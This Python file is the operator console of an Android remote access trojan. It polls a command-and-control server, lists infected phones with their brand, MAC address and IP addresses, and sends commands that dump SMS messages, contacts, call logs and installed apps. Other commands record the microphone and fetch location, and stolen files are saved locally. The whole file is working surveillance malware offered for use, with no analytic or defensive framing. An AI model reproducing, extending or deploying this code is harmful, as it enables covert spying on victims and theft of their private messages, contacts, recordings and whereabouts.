
import requests as r
import os
import sys
import time as t
import base64


def controller() :
 

 server_url = input("Enter the server url: ")


 GREEN_BOLD = "\033[1;92m"
 RESET = "\033[0m"

 print('[*] '+GREEN_BOLD+'initializing the server' +RESET)

 req = r.get(server_url+'/')
 if req.status_code == 200 :
   print('[*] '+GREEN_BOLD+'server is alive '+RESET)
 else :
   print("Access denied")
 t.sleep(.2)
 def post_text_data(url, data) :
    while True :
          data = r.post(url, data)
          
          if data.status_code == 200 :
             break 
    return data.status_code  



 def get_text_data(url, f) :
    password = "@dj393hf5f87+-d*d"
    send_data = {'password' : password , 'file' : f }
    data = r.post(url, data=str(send_data))
    data = data.text

    return data 


 def execute_internal_command(command) :
    if os.name  == 'nt' :
       print('sorry this is windows....')
    else :
       os.system(command)

 def clear() :
    if os.name  == 'nt' :
       os.system("cls")
    else :
       os.system("clear")

 def loadding_rats() :
    print('[*] '+GREEN_BOLD+"initializing the controller"+RESET)
    t.sleep(.2)
    print("")
    t.sleep(1)
    clear() 
    android_id = get_text_data(server_url+'/get_pent_text', 'house_rats')
    android_id = eval(android_id)
    android_id = list(android_id.keys())
    for house_rat in android_id :
      print("[*] \033[32mListening to the rats\033[0m")
      t.sleep(.5)
      sys.stdout.write("[ ")
   
      sys.stdout.flush()
      #{'house_rat' : house_rat , 'message' : 'offline'} 
      send_data = {'house_rat' : house_rat , 'message' : 'offline'} 
      
      post_text_data(server_url+'/house_rat', str(send_data))
      
      for i in range(10) :
          
          t.sleep(.5)
          sys.stdout.write("\033[32m█\033[0m")
          sys.stdout.flush()
      sys.stdout.write(" ]")
      sys.stdout.flush()
      t.sleep(.3)
      clear()
      
      
      
      
 def show_house_rats() :
    c = 0
    data = get_text_data(server_url+'/get_pent_text', 'house_rats')
    data = eval(data)
    global android_id_in_number 
    android_id_in_number = {}
    for house_rat in list(data.keys()) :
        c = c + 1
        status = data[house_rat]
        
        
        android_id_in_number[str(c)] = house_rat
        
        
        print()
        device_details = get_text_data(server_url+'/get_pent_text', 'android_id')
        device_details = eval(device_details)
        
        device_details = device_details[house_rat]
        show_device = f'[{c}] \033[32mDevice:\033[0m '+device_details['brand'] +' Android '+ device_details['version'] + ' \033[32mmac id:\033[0m '+device_details['mac_id']+' \033[32mip:\033[0m '+device_details['ip_addr']+' \033[32mintetnet ip:\033[0m '+device_details['internet_ip']+f' STATUS: {status} '
        for l in show_device :
            t.sleep(.02)
            sys.stdout.write(l)
            sys.stdout.flush() 
        print()

        
        
 def command_2(android_id, command) :
    r.post(server_url+'/reset', 'surgery')
    r.post(server_url+'/reset', 'tracks')
   
    post_text_data(server_url+'/Toxoplasma_pent', f'{android_id}/{command}')
  
    while True :
          t.sleep(1)
          #req = r.post(server_url+'/Toxoplasma_pent', data=f'{android_id}/{command}')
          #analyise the respones from the rat according to the android_id
          respones = get_text_data(server_url+'/get_pent_text', 'surgery')
          t.sleep(1)
          if not respones == '' :
         
             respones = eval(respones)[android_id]
             print(f"[*] \033[32mRespones\033[0m : {respones}")
             if "executed" in respones :
                t.sleep(1)
                data = get_text_data(server_url+'/get_pent_text', 'tracks')
                file_name = str(eval(data)[android_id])
                if file_name :
                   data = r.get(server_url+'/file_pent')
                   
                   f = open(file_name, 'wb')
                   f.write(data.content)
                   f.close()
                   
                   print()
                   print(f'[*] \033[32mfile downloaded at \033[0m./{file_name}')
                   
                   r.post(server_url+'/reset', 'surgery')
                   r.post(server_url+'/reset', 'tracks')
             print() 
             break 

 def command_1(android_id, command) :
    r.post(server_url+'/reset', 'surgery')
    r.post(server_url+'/reset', 'tracks')
   
    post_text_data(server_url+'/Toxoplasma_pent', f'{android_id}/{command}')
  
    while True :
          t.sleep(1)
          #req = r.post(server_url+'/Toxoplasma_pent', data=f'{android_id}/{command}')
          #analyise the respones from the rat according to the android_id
          respones = get_text_data(server_url+'/get_pent_text', 'surgery')
          t.sleep(1)
          if not respones == '' :
         
             respones = eval(respones)[android_id]
             print(f"[*] \033[32mRespones\033[0m : {respones}")
             if "success" in respones :
                t.sleep(1)
                data = get_text_data(server_url+'/get_pent_text', 'tracks')
                
                data = data.replace('\n', '<new_line>')
                print(str(eval(data)[android_id]).replace('<new_line>', '\n'))
                r.post(server_url+'/reset', 'surgery')
                r.post(server_url+'/reset', 'tracks')
             print() 
             break 
                

 loadding_rats() 
 show_house_rats() 


 while True :
  print()
  number = input("Enter id[list device] :")
  print()
  if not number :
    loadding_rats() 
    show_house_rats() 
    print()
    while True :
          number = input("Enter id[list device] :")
          if not number :
             loadding_rats() 
             show_house_rats()
             print()
          else :
              print()
              break 
    
    
  if 'exit' in number :
    print("Exiting......") 
    break
  elif 'clear' in number :
    clear() 

  else :
    android_id = android_id_in_number[number]
    while True :
          
          pent = input('\033[32mpent_terminal\033[0m:#')
          if pent :
             if 'exit' in pent :
                 break
             elif '!' in pent :
                  execute_internal_command(str(pent).replace('!', ''))
             elif 'clear' in pent :
                  clear() 
             elif 'help' in pent :
                print()
                 # \033[32m \033[0m
                print("[1] \033[32mdevice info\033[0m - collect the system info \n[2] \033[32mtorch on\033[0m - swicth on the torch \n[3] \033[32mtorch off\033[0m - swicth off the torch \n[4] \033[32mmicrophone\033[0m - record audio from microphone \n[5] \033[32mdump sms\033[0m - dump all sms \n[6] \033[32mdump contacts\033[0m - dump all contacts\n[7] \033[32mdump calls\033[0m - dump all calls \n[8] \033[32mdump apps\033[0m - dump all apps  \n[9] \033[32mlocation\033[0m - get location")
                print()
             elif 'torch off' in pent :
                  print("executing torch off......")
                  command_1(android_id, '5482')
             elif 'torch on' in pent :
                  print("executing tourch on .....")
                  command_1(android_id, '4333')
             elif 'device info' in pent :
                print("executing device info .....")
                command_1(android_id, '5587')
             elif 'dump sms' in pent :
                print("executing dump sms .........")
                command_2(android_id, '4589')
             elif 'dump contacts' in pent :
                print("executing dump contacts ....")
                command_2(android_id, '6958')
             elif 'dump apps' in pent : 
                print("executing dump apps ........")
                command_2(android_id, '5451')
             elif 'dump calls' in pent : 
                print("executing dump calls ........")
                command_2(android_id, '2575')
             elif 'microphone' in pent : 
                print("executing microphone ........")
                command_1(android_id, '6846')
                stop = input("Enter[stop]: ")
                if stop == 'stop' or stop == '' :
                   command_2(android_id, '5818')
             elif 'location' in pent : 
                print("executing location ........")
                command_1(android_id, '2889')
